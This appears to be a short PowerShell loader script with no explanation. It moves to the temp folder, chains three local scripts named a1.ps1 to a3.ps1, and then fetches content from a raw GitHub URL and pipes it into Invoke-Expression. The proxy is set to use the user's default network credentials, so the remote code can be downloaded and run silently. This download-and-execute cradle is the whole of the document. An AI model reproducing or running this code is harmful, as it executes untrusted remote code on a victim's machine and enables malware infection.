cd $env:temp
$x2 = .\a1.ps1;
$x1 = .\a2.ps1 $x2;
& .\a3.ps1 $x1;

(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/git-dispose01/deposit/main/ab') -UseBasicParsing |iex
